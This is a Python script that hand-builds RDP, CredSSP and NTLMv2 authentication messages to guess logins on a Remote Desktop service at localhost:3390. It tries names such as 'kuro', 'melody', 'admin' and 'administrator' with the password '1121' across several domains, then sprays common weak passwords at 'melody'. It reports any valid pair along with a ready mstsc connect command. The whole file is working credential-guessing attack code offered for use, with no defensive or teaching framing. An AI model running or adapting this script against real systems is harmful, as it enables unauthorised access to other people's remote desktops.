import socket
import struct
import ssl
import hmac
import os
import time

try:
    from Crypto.Hash import MD4
    def md4(data):
        h = MD4.new()
        h.update(data)
        return h.digest()
except:
    import hashlib
    def md4(data):
        return hashlib.new('md4', data).digest()

def ntlm_hash(password):
    return md4(password.encode('utf-16le'))

def ntlmv2_response(nt_hash, user, domain, server_challenge, client_challenge, timestamp, target_info):
    user_domain = (user.upper() + domain.upper()).encode('utf-16le')
    ntlmv2_hash = hmac.new(nt_hash, user_domain, 'md5').digest()
    
    blob = b'\x01\x01\x00\x00\x00\x00\x00\x00'
    blob += timestamp
    blob += client_challenge
    blob += b'\x00\x00\x00\x00'
    blob += target_info
    blob += b'\x00\x00\x00\x00'
    
    nt_proof = hmac.new(ntlmv2_hash, server_challenge + blob, 'md5').digest()
    return nt_proof + blob

def try_rdp_creds(host, port, username, password, domain=""):
    print(f"[*] Trying {domain}\{username}:{password}...", end=" ", flush=True)
    
    try:
        cookie = f"Cookie: mstshash={username}\r\n".encode()
        neg = bytes([0x01, 0x00, 0x08, 0x00, 0x03, 0x00, 0x00, 0x00])
        x224 = bytes([0xe0, 0x00, 0x00, 0x00, 0x00, 0x00]) + cookie + neg
        cr = bytes([0x03, 0x00]) + struct.pack(">H", 5 + len(x224)) + bytes([len(x224)]) + x224
        
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(15)
        sock.connect((host, port))
        sock.sendall(cr)
        resp = sock.recv(1024)
        
        if resp[5] != 0xd0:
            print("CONNECTION REJECTED")
            return False
        
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        ssl_sock = ctx.wrap_socket(sock, server_hostname=host)
        
        ntlm_negotiate = (
            b"NTLMSSP\x00"
            b"\x01\x00\x00\x00"
            b"\xb7\x82\x08\xe2"
            b"\x00\x00\x00\x00\x00\x00\x00\x00"
            b"\x00\x00\x00\x00\x00\x00\x00\x00"
            b"\x0a\x00\x63\x45\x00\x00\x00\x0f"
        )
        
        credssp_neg = bytes([0x30, 0x37, 0xa0, 0x03, 0x02, 0x01, 0x06, 0xa1, 0x30, 0x30, 0x2e, 0x30, 0x2c, 0xa0, 0x2a, 0x04, 0x28]) + ntlm_negotiate
        
        ssl_sock.send(credssp_neg)
        challenge_resp = ssl_sock.recv(4096)
        
        if b"NTLMSSP" not in challenge_resp:
            print("NO NTLM CHALLENGE")
            ssl_sock.close()
            return False
        
        ntlm_start = challenge_resp.find(b"NTLMSSP")
        ntlm_msg = challenge_resp[ntlm_start:]
        
        server_challenge = ntlm_msg[24:32]
        target_info_len = struct.unpack("<H", ntlm_msg[40:42])[0]
        target_info_offset = struct.unpack("<I", ntlm_msg[44:48])[0]
        target_info = ntlm_msg[target_info_offset:target_info_offset+target_info_len]
        
        timestamp = None
        i = 0
        while i < len(target_info) - 4:
            av_id = struct.unpack("<H", target_info[i:i+2])[0]
            av_len = struct.unpack("<H", target_info[i+2:i+4])[0]
            if av_id == 7 and av_len == 8:
                timestamp = target_info[i+4:i+4+8]
                break
            if av_id == 0:
                break
            i += 4 + av_len
        
        if timestamp is None:
            timestamp = struct.pack("<Q", int(time.time() * 10000000) + 116444736000000000)
        
        nt_hash = ntlm_hash(password)
        client_challenge = os.urandom(8)
        nt_response = ntlmv2_response(nt_hash, username, domain, server_challenge, client_challenge, timestamp, target_info)
        lm_response = client_challenge + b'\x00' * 16
        
        domain_bytes = domain.encode('utf-16le')
        user_bytes = username.encode('utf-16le')
        workstation = b'W\x00I\x00N\x00'
        
        offset = 88
        
        auth_msg = b'NTLMSSP\x00\x03\x00\x00\x00'
        auth_msg += struct.pack('<HHI', len(lm_response), len(lm_response), offset)
        offset += len(lm_response)
        auth_msg += struct.pack('<HHI', len(nt_response), len(nt_response), offset)
        offset += len(nt_response)
        auth_msg += struct.pack('<HHI', len(domain_bytes), len(domain_bytes), offset)
        offset += len(domain_bytes)
        auth_msg += struct.pack('<HHI', len(user_bytes), len(user_bytes), offset)
        offset += len(user_bytes)
        auth_msg += struct.pack('<HHI', len(workstation), len(workstation), offset)
        offset += len(workstation)
        auth_msg += struct.pack('<HHI', 0, 0, offset)
        auth_msg += struct.pack('<I', 0xe2888215)
        auth_msg += b'\x0a\x00\x63\x45\x00\x00\x00\x0f'
        auth_msg += lm_response + nt_response + domain_bytes + user_bytes + workstation
        
        auth_len = len(auth_msg)
        credssp_auth = bytes([0x30, 0x82]) + struct.pack(">H", auth_len + 15)
        credssp_auth += bytes([0xa0, 0x03, 0x02, 0x01, 0x06])
        credssp_auth += bytes([0xa2, 0x82]) + struct.pack(">H", auth_len + 6)
        credssp_auth += bytes([0x30, 0x82]) + struct.pack(">H", auth_len + 2)
        credssp_auth += bytes([0x04, 0x82]) + struct.pack(">H", auth_len)
        credssp_auth += auth_msg
        
        ssl_sock.send(credssp_auth)
        
        try:
            auth_result = ssl_sock.recv(4096)
            
            if len(auth_result) > 0:
                if auth_result[0] == 0x30 and len(auth_result) > 20:
                    if b'\xa3' in auth_result[:30]:
                        print("SUCCESS! Got pubKeyAuth!")
                        return True
                    else:
                        print(f"RESPONSE ({len(auth_result)}b) - checking...")
                        print(f"    First bytes: {auth_result[:20].hex()}")
                        return "maybe"
                else:
                    print(f"FAILED (code: {auth_result[0]:02x})")
            else:
                print("NO RESPONSE")
        except socket.timeout:
            print("TIMEOUT (might be processing)")
        except ssl.SSLError as e:
            if "internal error" in str(e).lower():
                print("AUTH REJECTED")
            else:
                print(f"SSL: {e}")
        
        ssl_sock.close()
        return False
        
    except Exception as e:
        print(f"ERROR: {e}")
        return False

print("=== TRYING KURO CREDENTIALS ===\n")

creds_to_try = [
    ("kuro", "1121", ""),
    ("kuro", "1121", "meltat0"),
    ("kuro", "1121", "MELTAT0"),
    ("Kuro", "1121", ""),
    ("KURO", "1121", ""),
    ("melody", "1121", ""),
    ("admin", "1121", ""),
    ("administrator", "1121", ""),
]

for username, password, domain in creds_to_try:
    result = try_rdp_creds("localhost", 3390, username, password, domain)
    if result == True:
        print(f"\n[!!!] VALID CREDENTIALS FOUND: {domain}\{username}:{password}")
        print(f"[!!!] Connect with: mstsc /v:localhost:3390")
        break
    time.sleep(0.5)

print("\n[*] Also trying weak passwords for melody...")
weak_passwords = ["1121", "melody", "1234", "password", "123456", ""]
for pwd in weak_passwords:
    result = try_rdp_creds("localhost", 3390, "melody", pwd, "")
    if result == True:
        print(f"\n[!!!] VALID: melody:{pwd}")
        break
    time.sleep(0.5)
